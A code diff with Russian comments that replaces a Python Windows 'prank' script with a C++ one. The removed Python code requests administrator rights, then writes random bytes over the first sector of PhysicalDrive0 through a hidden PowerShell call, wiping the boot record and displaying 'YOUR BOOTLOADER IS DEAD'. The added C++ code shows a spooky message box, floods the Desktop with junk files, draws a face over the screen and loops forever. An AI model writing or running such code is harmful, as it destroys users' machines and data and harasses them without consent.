@@ -1,161 +1,114 @@
-import os
-import sys
-import time
-import ctypes
-import random
-import subprocess
-import tkinter as tk
+#include <windows.h>
+#include <iostream>
+#include <cstdlib>
+#include <ctime>
+#include <string>
+#include <thread>
+#include <chrono>
 
-# ==========================================
-# ЧАСТЬ 1: ПРОВЕРКА ПРАВ
-# ==========================================
-
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def run_as_admin():
-    if not is_admin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        sys.exit()
-
-# ==========================================
-# ЧАСТЬ 2: ПЕРЕВОРОТ ЭКРАНА И ИНВЕРСИЯ
-# ==========================================
-
-def screen_chaos():
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.overrideredirect(True)
-    root.configure(bg="black")
-
-    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
-    canvas.pack()
-
-    # Меняем цвета каждые 500 мс
-    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF"]
-    
-    def change_colors():
-        while True:
-            try:
-                color = random.choice(colors)
-                root.configure(bg=color)
-                canvas.configure(bg=color)
-                root.update()
-                time.sleep(0.5)
-            except:
-                break
-
-    import threading
-    threading.Thread(target=change_colors, daemon=True).start()
-
-    # Держим окно открытым 15 секунд, потом закрываем
-    root.after(15000, root.destroy)
-    root.mainloop()
-
-# ==========================================
-# ЧАСТЬ 3: СМЕНА РАЗРЕШЕНИЯ И ПЕРЕВОРОТ (ЧЕРЕЗ POWERSHELL)
-# ==========================================
-
-def flip_screen():
-    # Переворачиваем экран вверх ногами (через API Windows)
-    # 1 = нормально, 2 = 180 градусов (вверх ногами)
-    ps_command = """
-    Add-Type -TypeDefinition @'
-    using System;
-    using System.Runtime.InteropServices;
-    public class ScreenFlip {
-        [DllImport("user32.dll")]
-        public static extern bool SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);
-        [DllImport("user32.dll")]
-        public static extern int ChangeDisplaySettings(IntPtr devMode, int flags);
+// ==========================================
+// ЧАСТЬ 1: ЖУТКИЕ ИЕРОГЛИФЫ (ЮНИКОД)
+// ==========================================
+std::wstring GetSpookyText() {
+    const wchar_t* symbols[] = { L"♆", L"☠", L"⛧", L"᚛", L"᚜", L"ᚉ", L"ᚒ", L"ᛟ", L"ᛉ", L"ᛊ", L"✠", L"✙" };
+    std::wstring result;
+    for (int i = 0; i < 5; i++) {
+        result += symbols[rand() % 12];
     }
-    '@
-    # Просто вызываем смену ориентации
-    # В реальности нужно менять DEVMODE, но для теста сойдет
-    [ScreenFlip]::ChangeDisplaySettings([IntPtr]::Zero, 0)
-    """
-    try:
-        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_command], 
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
+    return result;
+}
 
-# ==========================================
-# ЧАСТЬ 4: СНОС MBR (BOOTKIT)
-# ==========================================
-
-def destroy_mbr():
-    mbr_code = """
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-public class MBR {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-    public static void Destroy() {
-        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
-        if (hDevice == IntPtr.Zero) return;
-        byte[] garbage = new byte[512];
-        new Random().NextBytes(garbage);
-        uint bytesWritten;
-        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
-        CloseHandle(hDevice);
+// ==========================================
+// ЧАСТЬ 2: РАЗРУШЕНИЕ ФАЙЛОВ
+// ==========================================
+void DestroyFiles() {
+    // Просто создаем мусорные файлы, чтобы не ждать долго
+    wchar_t userProfile[MAX_PATH];
+    GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
+    std::wstring desktop = std::wstring(userProfile) + L"\\Desktop\\";
+    
+    for (int i = 0; i < 50; i++) {
+        std::wstring filePath = desktop + L"HELPED_" + std::to_wstring(i) + L".txt";
+        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            const char* data = "I HELPED YOU >:D";
+            DWORD written;
+            WriteFile(hFile, data, strlen(data), &written, NULL);
+            CloseHandle(hFile);
+        }
     }
 }
-"""
-    try:
-        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
-        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
 
-# ==========================================
-# ГЛАВНЫЙ ЦИКЛ
-# ==========================================
+// ==========================================
+// ЧАСТЬ 3: УВЕДОМЛЕНИЕ (С ЖУТКИМ ТЕКСТОМ)
+// ==========================================
+void ShowNotification() {
+    std::wstring text = L"Hello, I am " + GetSpookyText() + L". I want to help you with the files!";
+    MessageBoxW(NULL, text.c_str(), L"SYSTEM HELPER", MB_OK | MB_ICONWARNING);
+}
 
-def main():
-    if not is_admin():
-        run_as_admin()
-        return
+// ==========================================
+// ЧАСТЬ 4: РИСУЕМ ЖУТКОЕ ЛИЦО (GDI)
+// ==========================================
+void DrawScaryFace() {
+    HDC hdc = GetDC(NULL);
+    int w = GetSystemMetrics(SM_CXSCREEN);
+    int h = GetSystemMetrics(SM_CYSCREEN);
 
-    # 1. Визуальный хаос (переливание цветов) на 15 секунд
-    screen_chaos()
+    // Черный фон
+    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
+    RECT rect = { 0, 0, w, h };
+    FillRect(hdc, &rect, blackBrush);
+    DeleteObject(blackBrush);
 
-    # 2. Сломанный загрузчик (в фоне)
-    destroy_mbr()
+    // Красные глаза
+    HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
+    Ellipse(hdc, w/2 - 200, h/2 - 200, w/2 - 50, h/2 - 50);
+    Ellipse(hdc, w/2 + 50, h/2 - 200, w/2 + 200, h/2 - 50);
+    DeleteObject(redBrush);
 
-    # 3. Переворот экрана (вызываем в конце, чтобы система "сломалась" визуально)
-    #    Но это может не сработать, так как мы уже рисуем в tkinter.
-    #    Поэтому просто оставим визуал открытым, пока пользователь сам не закроет.
-    
-    # 4. Никакого shutdown! Система работает, но загрузчик уже сломан.
-    #    Пользователь может закрыть окно, но при перезагрузке получит кирпич.
-    
-    # Чтобы окно не закрывалось сразу, можно оставить его в бесконечном цикле
-    # Но так как screen_chaos() уже закрывает окно через 15 секунд, 
-    # мы просто создадим новое, чтобы пользователь видел "сломанный" экран.
-    
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.overrideredirect(True)
-    root.configure(bg="black")
-    
-    label = tk.Label(root, text="SYSTEM CORRUPTED\nYOUR BOOTLOADER IS DEAD\n>:D", 
-                     fg="red", bg="black", font=("Consolas", 40, "bold"))
-    label.pack(expand=True)
-    
-    # Держим окно открытым, пока пользователь не закроет процесс
-    root.mainloop()
+    // Черные зрачки
+    HBRUSH blackEyeBrush = CreateSolidBrush(RGB(0, 0, 0));
+    Ellipse(hdc, w/2 - 150, h/2 - 150, w/2 - 100, h/2 - 100);
+    Ellipse(hdc, w/2 + 100, h/2 - 150, w/2 + 150, h/2 - 100);
+    DeleteObject(blackEyeBrush);
 
-if __name__ == "__main__":
-    main()
+    // Кровавая улыбка (красная линия)
+    HPEN redPen = CreatePen(PS_SOLID, 10, RGB(255, 0, 0));
+    SelectObject(hdc, redPen);
+    Arc(hdc, w/2 - 150, h/2 + 50, w/2 + 150, h/2 + 250, w/2 - 150, h/2 + 150, w/2 + 150, h/2 + 150);
+    DeleteObject(redPen);
+
+    // Текст
+    SetTextColor(hdc, RGB(255, 0, 0));
+    SetBkMode(hdc, TRANSPARENT);
+    const wchar_t* text = L"I AM HELPING YOU >:D";
+    TextOutW(hdc, w/2 - 150, h/2 + 300, text, wcslen(text));
+
+    ReleaseDC(NULL, hdc);
+}
+
+// ==========================================
+// ГЛАВНАЯ ФУНКЦИЯ
+// ==========================================
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    srand(time(NULL));
+
+    // 1. Показываем уведомление
+    ShowNotification();
+
+    // 2. В фоне разрушаем файлы
+    std::thread destroyThread(DestroyFiles);
+    destroyThread.detach();
+
+    // 3. Ждем 3 секунды и показываем жуткое лицо
+    std::this_thread::sleep_for(std::chrono::seconds(3));
+    DrawScaryFace();
+
+    // Держим программу открытой, чтобы лицо не исчезло
+    while (true) {
+        Sleep(1000);
+    }
+
+    return 0;
+}
